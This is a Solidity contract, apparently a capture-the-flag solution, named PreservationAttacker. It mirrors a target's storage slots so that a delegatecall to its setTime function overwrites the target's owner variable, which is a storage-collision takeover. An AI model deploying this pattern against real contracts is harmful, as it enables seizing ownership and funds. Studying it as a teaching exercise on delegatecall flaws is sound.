pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT

import "hardhat/console.sol";

contract PreservationAttacker {

    address public timeZone1Library;
    address public timeZone2Library;
    uint public owner; 

    function setTime(uint _time) public {
        owner = _time;
    }

}
